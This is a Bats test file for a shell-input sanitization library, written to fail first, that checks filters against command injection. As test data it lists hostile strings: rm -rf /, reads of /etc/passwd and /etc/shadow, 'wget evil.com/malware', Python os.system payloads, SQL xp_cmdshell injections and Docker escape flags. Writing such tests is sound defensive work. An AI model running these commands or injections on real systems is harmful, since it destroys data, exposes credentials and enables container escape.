#!/usr/bin/env bats

# TDD: Tests MUST FAIL first (RED phase)
# Testing command injection prevention security

setup() {
    load test_helper
    TEST_DIR="$(mktemp -d)"
    cd "$TEST_DIR"

    # Copy security libraries
    cp -r "${BATS_TEST_DIRNAME}/../../lib/security" lib/
}

teardown() {
    cd /
    rm -rf "$TEST_DIR"
}

@test "security: Shell command injection via backticks blocked" {
    # Command injection attempts with backticks
    local bad_inputs=(
        "file\`whoami\`.txt"
        "test\`rm -rf /\`"
        "name\`cat /etc/passwd\`"
    )

    # THIS TEST WILL FAIL: No backtick filtering
    source lib/security/sanitize.sh
    for input in "${bad_inputs[@]}"; do
        run sanitize_shell_input "$input"
        [ "$status" -eq 0 ]

        # Should not contain backticks (THIS WILL FAIL)
        [[ ! "$output" =~ \` ]]
    done
}

@test "security: Shell command injection via \$() blocked" {
    # Command substitution attempts
    local bad_inputs=(
        "file\$(whoami).txt"
        "test\$(rm -rf /)end"
        "\$(cat /etc/shadow)"
        "\${IFS}command"
    )

    # THIS TEST WILL FAIL: No command substitution filtering
    for input in "${bad_inputs[@]}"; do
        run sanitize_shell_input "$input"
        [ "$status" -eq 0 ]

        # Should not contain $( or ${ (THIS WILL FAIL)
        [[ ! "$output" =~ \$\( ]]
        [[ ! "$output" =~ \$\{ ]]
    done
}

@test "security: Pipe character injection blocked" {
    # Pipe injection attempts
    local bad_inputs=(
        "file.txt | cat /etc/passwd"
        "test | rm -rf /"
        "name|whoami"
        "|| malicious_command"
    )

    # THIS TEST WILL FAIL: No pipe filtering
    for input in "${bad_inputs[@]}"; do
        run sanitize_shell_input "$input"
        [ "$status" -eq 0 ]

        # Should escape or remove pipes (THIS WILL FAIL)
        [[ ! "$output" =~ \| ]] || [[ "$output" =~ \\\| ]]
    done
}

@test "security: Semicolon command chaining blocked" {
    # Command chaining attempts
    local bad_inputs=(
        "file.txt; rm -rf /"
        "test;whoami"
        "name;cat /etc/passwd"
        ";malicious_command"
    )

    # THIS TEST WILL FAIL: No semicolon filtering
    for input in "${bad_inputs[@]}"; do
        run sanitize_shell_input "$input"
        [ "$status" -eq 0 ]

        # Should escape or remove semicolons (THIS WILL FAIL)
        [[ ! "$output" =~ \; ]] || [[ "$output" =~ \\\; ]]
    done
}

@test "security: Ampersand background execution blocked" {
    # Background execution attempts
    local bad_inputs=(
        "file.txt & malicious &"
        "test&& rm -rf /"
        "name& whoami"
        "&& evil_command"
    )

    # THIS TEST WILL FAIL: No ampersand filtering
    for input in "${bad_inputs[@]}"; do
        run sanitize_shell_input "$input"
        [ "$status" -eq 0 ]

        # Should escape or remove ampersands (THIS WILL FAIL)
        [[ ! "$output" =~ \& ]] || [[ "$output" =~ \\\& ]]
    done
}

@test "security: Redirection operators blocked" {
    # Redirection attempts
    local bad_inputs=(
        "file > /etc/passwd"
        "test < /etc/shadow"
        "2>&1"
        ">> /tmp/evil"
        "<< EOF"
    )

    # THIS TEST WILL FAIL: No redirection filtering
    for input in "${bad_inputs[@]}"; do
        run sanitize_shell_input "$input"
        [ "$status" -eq 0 ]

        # Should escape or remove redirections (THIS WILL FAIL)
        [[ ! "$output" =~ [<>] ]] || [[ "$output" =~ \\[<>] ]]
    done
}

@test "security: Newline injection blocked" {
    # Newline injection attempts
    local bad_inputs=(
        $'first\nrm -rf /'
        $'test\nwhoami'
        $'name\r\nmalicious'
    )

    # THIS TEST WILL FAIL: No newline filtering
    for input in "${bad_inputs[@]}"; do
        run sanitize_shell_input "$input"
        [ "$status" -eq 0 ]

        # Should not contain newlines (THIS WILL FAIL)
        [[ ! "$output" =~ $'\n' ]]
        [[ ! "$output" =~ $'\r' ]]
    done
}

@test "security: Environment variable injection blocked" {
    # Environment variable injection
    local bad_inputs=(
        "\$PATH"
        "\${HOME}"
        "\$IFS"
        "\$LD_PRELOAD"
    )

    # THIS TEST WILL FAIL: No env var filtering
    for input in "${bad_inputs[@]}"; do
        run sanitize_for_execution "$input"
        [ "$status" -eq 0 ]

        # Should not expand variables (THIS WILL FAIL)
        [[ ! "$output" =~ \$ ]] || [[ "$output" =~ \\\$ ]]
    done
}

@test "security: Eval usage prevented" {
    # Code that might use eval
    local dangerous_code='eval "$USER_INPUT"'

    # THIS TEST WILL FAIL: No eval prevention
    run detect_dangerous_constructs "$dangerous_code"
    [ "$status" -ne 0 ]  # Should detect eval usage

    # Should report eval danger (THIS WILL FAIL)
    [[ "$output" =~ "eval" ]]
}

@test "security: Whitelist-based command validation" {
    # Only allow specific safe commands
    local allowed_commands=("ls" "cat" "echo")
    local test_commands=(
        "rm -rf /"
        "wget evil.com/malware"
        "chmod 777 /etc/passwd"
        "ls -la"  # This should pass
    )

    # THIS TEST WILL FAIL: No whitelist validation
    for cmd in "${test_commands[@]}"; do
        run validate_command_whitelist "$cmd" "${allowed_commands[@]}"

        if [[ "$cmd" =~ ^ls ]]; then
            [ "$status" -eq 0 ]  # ls should be allowed
        else
            [ "$status" -ne 0 ]  # Others should be blocked
        fi
    done
}

@test "security: Argument injection in safe commands blocked" {
    # Injection in seemingly safe commands
    local bad_args=(
        "ls -la /etc/passwd"
        "echo test > /etc/passwd"
        "cat /etc/shadow"
        "grep -r password /"
    )

    # THIS TEST WILL FAIL: No argument validation
    for args in "${bad_args[@]}"; do
        run validate_command_arguments "$args"
        [ "$status" -ne 0 ]  # Should block dangerous arguments
    done
}

@test "security: Python command injection blocked" {
    # Python-specific injection
    local py_injections=(
        "__import__('os').system('id')"
        "eval('malicious')"
        "exec('import os; os.system(\"whoami\")')"
        "compile('evil', 'string', 'exec')"
    )

    # THIS TEST WILL FAIL: No Python injection prevention
    for injection in "${py_injections[@]}"; do
        run sanitize_python_input "$injection"
        [ "$status" -eq 0 ]

        # Should not contain dangerous functions (THIS WILL FAIL)
        [[ ! "$output" =~ "__import__" ]]
        [[ ! "$output" =~ "eval" ]]
        [[ ! "$output" =~ "exec" ]]
    done
}

@test "security: SQL command execution blocked" {
    # SQL command execution attempts
    local sql_commands=(
        "'; EXEC xp_cmdshell('whoami'); --"
        "'; EXEC sp_execute_external_script @language=N'Python', @script=N'import os; os.system(\"id\")'; --"
        "INTO OUTFILE '/etc/passwd'"
    )

    # THIS TEST WILL FAIL: No SQL command blocking
    for sql in "${sql_commands[@]}"; do
        run block_sql_commands "$sql"
        [ "$status" -ne 0 ]  # Should block SQL commands
    done
}

@test "security: Docker command injection blocked" {
    # Docker escape attempts
    local docker_injections=(
        "--privileged"
        "-v /:/host"
        "--pid=host"
        "--cap-add=SYS_ADMIN"
        "exec -it container /bin/sh"
    )

    # THIS TEST WILL FAIL: No Docker injection prevention
    for injection in "${docker_injections[@]}"; do
        run validate_docker_args "$injection"
        [ "$status" -ne 0 ]  # Should block dangerous Docker args
    done
}